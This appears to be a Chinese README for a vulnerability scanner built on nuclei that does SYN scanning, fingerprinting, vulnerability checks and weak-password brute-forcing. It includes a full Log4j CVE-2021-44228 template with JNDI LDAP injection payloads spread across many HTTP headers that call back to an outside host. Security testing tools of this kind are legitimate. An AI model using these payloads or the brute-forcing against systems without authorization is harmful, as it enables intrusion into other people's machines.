# 描述
  本项目是一款基于nuclei v2.9.6源码修改的漏洞扫描工具，主要功能包括了syn快速扫描，指纹识别以及漏洞扫描，并涵盖了多个弱口令爆破。
# 优缺点（对比fscan）
## 优点
 	1、使用流水线式并发，不用阶段性等待，syn扫描速度更快，适用于大型网络扫描
 	2、基于nuclei修改，开源poc更丰富，可以自定义poc,数据库集成poc,指纹后续可自定义性更强
 	3、爆破弱口令时，成功会自动停止爆破不再尝试
 	4、数据结构化，可用于后续的开发
## 缺点
	1、流水线式并发在爆破弱口令时会采用单线程爆破，爆破速相对会慢
 	2、采用syn扫描在网络波动较大时有可能丢包，切不会再次尝试发送syn报文
# 项目缺点
 	1、该项目由本人一人开发，维护和扩展性有待提高，bug还有待测试，目前只支持linux系统。后续可能会添加windows系统
 	2、本来有一个服务端和web数据可视化，但是奈何本人前端知识有限，实在是过于难看
 	3、在内网渗透中使用困难，目前只适用于公网扫描或者在自己机器上安装使用
# 食用方式
	1、安装mongodb
 	2、单独编译项目中initDb.go文件成可执行文件，并将"mh3Collection.json,pocCollection.json,responseCollection.json"放置在同一目录后运行初始化数据库
	3、安装libpcap依赖库，centos下使用命令yum intsall libpcap-devel
 	4、非常重要的一步，一定要关闭防火墙，关闭防火墙后，操作系统会自动回复rst,否则根据tcp重连机制，大概率会收到3次tcp ack数据包
# nuclei模板编写注意事项
## 以log4j为例
```
id: CVE-2021-44228

info:
  name: Apache Log4j2 远程命令执行
  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea,j4vaovo
  severity: critical
  description: |
    Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
  tags: log4j
  metadata:
    max-request: 2

http:
  - raw:
      - |
        GET /?x=${jndi:ldap://{{interactsh}}/{{url}}} HTTP/1.1
        Host: {{Hostname}}

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Accept: application/xml, application/json, text/plain, text/html, */${jndi:ldap://{{interactsh}}/{{header}}}
        Accept-Encoding: ${jndi:ldap://{{interactsh}}/{{header}}}
        Accept-Language: ${jndi:ldap://{{interactsh}}/{{header}}}
        Access-Control-Request-Headers: ${jndi:ldap://{{interactsh}}/{{header}}}
        Access-Control-Request-Method: ${jndi:ldap://{{interactsh}}/{{header}}}
        Authentication: Basic ${jndi:ldap://{{interactsh}}/{{header}}}
        Authentication: Bearer ${jndi:ldap://{{interactsh}}/{{header}}}
        Cookie: ${jndi:ldap://{{interactsh}}/{{header}}}
        Location: ${jndi:ldap://{{interactsh}}/{{header}}}
        Origin: ${jndi:ldap://{{interactsh}}/{{header}}}
        Referer: ${jndi:ldap://{{interactsh}}/{{header}}}
        Upgrade-Insecure-Requests: ${jndi:ldap://{{interactsh}}/{{header}}}
        User-Agent: ${jndi:ldap://{{interactsh}}/{{header}}}
        X-Api-Version: ${jndi:ldap://{{interactsh}}/{{header}}}
        X-CSRF-Token: ${jndi:ldap://{{interactsh}}/{{header}}}
        X-Druid-Comment: ${jndi:ldap://{{interactsh}}/{{header}}}
        X-Forwarded-For: ${jndi:ldap://{{interactsh}}/{{header}}}
        X-Origin: ${jndi:ldap://{{interactsh}}/{{header}}}
```
	其中interactsh表示回连本机地址，在公网扫描中需要将参数in设置成公网出口ip，在plugin/pocScan代码中，会将interactsh自动替换成In参数设置的ip地址来接受回连请求
# 后续
	将提高代码扩展性，优化性能

	
